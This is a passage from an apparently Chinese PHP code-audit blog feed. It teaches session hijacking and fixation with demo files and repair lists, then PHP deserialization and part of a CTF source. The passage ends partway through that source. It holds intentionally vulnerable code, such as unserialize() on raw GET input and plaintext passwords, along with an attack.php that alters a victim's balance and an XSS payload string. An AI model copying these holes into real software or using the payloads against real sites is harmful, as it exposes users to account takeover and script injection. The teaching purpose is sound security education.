class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>login.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>form<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    账号：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>    密码：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>登录<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>login<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>member.php:</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"访客的session id是："</span><span class="token punctuation">.</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"访客昵称："</span><span class="token punctuation">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"账户余额："</span><span class="token punctuation">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'book'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>attack.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"访客的session id是："</span><span class="token punctuation">.</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"访客昵称："</span><span class="token punctuation">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"book的商品数量："</span><span class="token punctuation">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'book'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1000</span> <span class="token punctuation">.</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>db.sql</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">SET</span> FOREIGN_KEY_CHECKS<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">DATABASE</span> admin<span class="token punctuation">;</span><span class="token keyword">USE</span> admin<span class="token punctuation">;</span><span class="token comment" spellcheck="true">-- ----------------------------</span><span class="token comment" spellcheck="true">-- Table structure for `user`</span><span class="token comment" spellcheck="true">-- ----------------------------</span><span class="token keyword">DROP</span> <span class="token keyword">TABLE</span> <span class="token keyword">IF</span> <span class="token keyword">EXISTS</span> <span class="token punctuation">`</span><span class="token keyword">user</span><span class="token punctuation">`</span><span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token punctuation">`</span><span class="token keyword">user</span><span class="token punctuation">`</span> <span class="token punctuation">(</span>  <span class="token punctuation">`</span>ID<span class="token punctuation">`</span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>  <span class="token punctuation">`</span>username<span class="token punctuation">`</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>  <span class="token punctuation">`</span>password<span class="token punctuation">`</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>  <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span><span class="token punctuation">`</span>ID<span class="token punctuation">`</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">ENGINE</span><span class="token operator">=</span>MyISAM <span class="token keyword">DEFAULT</span> <span class="token keyword">CHARSET</span><span class="token operator">=</span>utf8<span class="token punctuation">;</span><span class="token comment" spellcheck="true">-- ----------------------------</span><span class="token comment" spellcheck="true">-- Records of user</span><span class="token comment" spellcheck="true">-- ----------------------------</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token punctuation">`</span><span class="token keyword">user</span><span class="token punctuation">`</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'admin'</span><span class="token punctuation">,</span> <span class="token string">'123456'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token punctuation">`</span><span class="token keyword">user</span><span class="token punctuation">`</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'root'</span><span class="token punctuation">,</span> <span class="token string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token punctuation">`</span><span class="token keyword">user</span><span class="token punctuation">`</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token string">'guest'</span><span class="token punctuation">,</span> <span class="token string">'666666'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h4><ol><li><p>首先用户登录网上钱包，网站会返回给你一个<code>session id</code>:<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201210164739593.png" alt="在这里插入图片描述"></p></li><li><p>此时黑客采取了某种手段，或取到了你的这一串<code>session id</code>，然后在他自己构造的attack.php页面上，导入你的<code>session id</code>，对你的账户进行了<code>会话劫持攻击</code>:</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201210164222680.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">保存session id后刷新页面，成功劫持会话，并且恶意修改了受害者的账户余额：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201210164702955.png" alt="在这里插入图片描述"></p></li><li><p>此时用户刷新个人信息界面，发现自己账户里的余额已经从100个w变成了0.000001个w了<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201210165118469.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li></ol><h4 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h4><ul><li>使用随机且长度够大的字符串来当作session id</li><li>将网页传递的数据使用某种形式进行封装，特别是session id</li><li>更改session名称</li><li>注销后即销毁所有session数据</li></ul><h3 id="session固定攻击"><a href="#session固定攻击" class="headerlink" title="session固定攻击"></a>session固定攻击</h3><blockquote><p>会话固定（Session fixation）是一种<code>诱骗</code>受害者使用攻击者指定的会话标识（SessionID）的攻击手段。这是攻击者获取合法会话标识的<code>最简单的方法</code>。<code>（让合法用户使用黑客预先设置的sessionID进行登录，从而是Web不再进行生成新的sessionID，从而导致黑客设置的sessionId变成了合法桥梁。）</code><br>会话固定也可以看成是会话劫持的一种类型，原因是会话固定的攻击的主要目的同样是获得目标用户的合法会话，不过会话固定还可以是强迫受害者使用攻击者设定的一个有效会话，以此来<code>获得用户的敏感信息</code>。</p></blockquote><h4 id="攻击流程-1"><a href="#攻击流程-1" class="headerlink" title="攻击流程"></a>攻击流程</h4><ol><li>攻击者通过某种手段重置目标用户的SessionID，然后监听用户会话状态；</li><li>目标用户携带攻击者设定的Session ID登录站点；</li><li>攻击者通过Session ID获得合法会话。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/img_convert/7a5ec57d59abbf693655dc7543643853.png#pic_center" alt="在这里插入图片描述"></p><h4 id="修复方案-1"><a href="#修复方案-1" class="headerlink" title="修复方案"></a>修复方案</h4><ul><li>不要从GET/POST变量中接收session id</li><li>调用session_start()函数后，立即产生新的session id，删除旧的session</li><li>将session id存放在cookie内</li><li>注销后即销毁session的所有数据</li><li>使用时间戳来记录session的使用时间，若两次session id相差时间太长，就销毁session的所有数据</li><li>检查用户的ip地址，若ip地址发生变化就生成一个新的session id。并删除旧的session</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 代码审计篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 会话认证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计基础：反序列化漏洞</title>
      <link href="/posts/8f83a13c.html"/>
      <url>/posts/8f83a13c.html</url>
      
        <content type="html"><![CDATA[<h3 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h3><ul><li>序列化：把对象转换为字节序列的过程，称为对象的序列化。</li><li>反序列化：把字节序列恢复为对象的过程，称为对象的反序列化。</li></ul><p>这两点都是很官方的说法，虽然正确但不好理解，还是先创建一个对象吧，把它实例化后再序列化，看看是一个什么效果：<br>demo1.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">DemoClass</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">"Zhangsan"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$sex</span> <span class="token operator">=</span> <span class="token string">"man"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token string">"27"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$zhangsan</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DemoClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$zhangsan</span> <span class="token operator">-</span><span class="token operator">></span> name <span class="token operator">=</span> <span class="token string">"Lisi"</span><span class="token punctuation">;</span><span class="token variable">$zhangsan</span> <span class="token operator">-</span><span class="token operator">></span> sex <span class="token operator">=</span> <span class="token string">"Woman"</span><span class="token punctuation">;</span><span class="token variable">$zhangsan</span> <span class="token operator">-</span><span class="token operator">></span> age <span class="token operator">=</span> <span class="token number">18</span><span class="token punctuation">;</span><span class="token variable">$Lisi</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$zhangsan</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行后就是序列化后的结果，先来解释一下它们的含义：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201208093157865.png" alt="在这里插入图片描述"><code>O:9:"DemoClass:"</code> 代表有一个<strong>Object</strong>，名字长度为<strong>9</strong>，名字是<strong>DemoClass</strong><br><code>3:{}</code> 代表有<strong>3</strong>个属性<br><code>s:4:"name:"</code> 代表属性是<strong>str</strong>类型，长度为<strong>4</strong>，属性名为<strong>name</strong><br><code>s:4:""Lisi;</code> 代表属性值是<strong>str</strong>类型，长度为<strong>4</strong>，属性值为<strong>Lisi</strong></p><p>那么反序列化回来的话，就把上面的语句unserialize一下就行：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*    $book = array('book1'=>'Harry Potter','book2'=>'MR.Bean','book3'=>'Python Cookbook','book4'=>'History');    $json = json_encode($book);    echo $json;*/</span><span class="token keyword">class</span> <span class="token class-name">DemoClass</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">"Zhangsan"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$sex</span> <span class="token operator">=</span> <span class="token string">"man"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token string">"27"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$zhangsan</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DemoClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$zhangsan</span> <span class="token operator">-</span><span class="token operator">></span> name <span class="token operator">=</span> <span class="token string">"Lisi"</span><span class="token punctuation">;</span><span class="token variable">$zhangsan</span> <span class="token operator">-</span><span class="token operator">></span> sex <span class="token operator">=</span> <span class="token string">"Woman"</span><span class="token punctuation">;</span><span class="token variable">$zhangsan</span> <span class="token operator">-</span><span class="token operator">></span> age <span class="token operator">=</span> <span class="token number">18</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//$Lisi = serialize($zhangsan);</span><span class="token comment" spellcheck="true">//echo $Lisi;</span><span class="token variable">$Lisi</span> <span class="token operator">=</span> <span class="token string">'O:9:"DemoClass":3:{s:4:"name":s:4:"Lisi";s:3:"sex":s:5:"Woman";s:3:"age":i:18;}'</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$Lisi</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201208100701223.png" alt="在这里插入图片描述"></p><h3 id="序列化的不同结果"><a href="#序列化的不同结果" class="headerlink" title="序列化的不同结果"></a>序列化的不同结果</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">DemoClass</span><span class="token punctuation">{</span>    <span class="token shell-comment comment"># 公共的</span>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">"Zhangsan"</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 受保护的</span>    <span class="token keyword">protected</span> <span class="token variable">$sex</span> <span class="token operator">=</span> <span class="token string">"man"</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 私有的</span>    <span class="token keyword">private</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token string">"27"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$zhangsan</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DemoClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$zhangsan</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：</p><pre class="line-numbers language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string">"DemoClass"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"Zhangsan"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"*sex"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"man"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string">"DemoClassage"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">"27"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201208155926281.png" alt="在这里插入图片描述"><br>这里可以看到，私有属性跟被保护属性的序列化结果有所不同，它们的序列化数据结构是这样的：</p><pre><code>私有属性：/00类名属性名/00受保护属性：/00属性名/00</code></pre><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>要想知道漏洞成因，就要理解常见的那几个<a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.wakeup" target="_blank" rel="noopener">魔术方法</a>，它们通常以__开头：</p><pre><code>__construct()当一个对象创建时被调用__destruct()当一个对象销毁时被调用__toString()当一个对象被当作一个字符串使用__sleep() 在对象在被序列化之前运行__wakeup将在序列化之后立即被调用</code></pre><p>漏洞的成因就是因为在反序列化的过程中，用户传的值未经过滤，直接放到这些魔术方法中了，举一个非常简单的例子：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">"Lisi"</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">' __wakeup()开始工作'</span><span class="token punctuation">.</span><span class="token string">'&lt;/br>'</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span>  <span class="token string">'姓名：'</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token string">'Zhangsan'</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token string">'&lt;/br>'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"__destruct()开始工作"</span><span class="token punctuation">.</span><span class="token string">'&lt;/br>'</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">'姓名：'</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$a_unser</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'Don\'t GET test value !'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们正常向网站GET的数据应该是这样的：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>test<span class="token operator">=</span>O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>S<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"name"</span><span class="token punctuation">:</span>S<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Lisi"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是我们也可以这么传值：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>test<span class="token operator">=</span>O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">%</span><span class="token constant">22A</span><span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>S<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token operator">%</span>22name<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">;</span>S<span class="token punctuation">:</span><span class="token number">25</span><span class="token punctuation">:</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Cscript<span class="token operator">%</span><span class="token function">3Ealert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token constant">3C</span><span class="token operator">/</span>script<span class="token operator">%</span><span class="token constant">3E</span><span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样就造成了一个反射型XSS。。。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201208142542611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h3><p>这是网上的一道CTF题源码，一起来分析一下吧</p><p>3.php：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">class</span> <span class="token class-name">SoFun</span><span class="token punctuation">{</span>         <span class="token keyword">protected</span> <span class="token variable">$file</span><span class="token operator">=</span><span class="token string">'flag.php'</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">{</span>             <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token operator">=</span><span class="token variable">$file</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>             <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strchr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token string">"\\"</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token boolean">false</span> <span class="token keyword">or</span> <span class="token function">strchr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token string">'/'</span><span 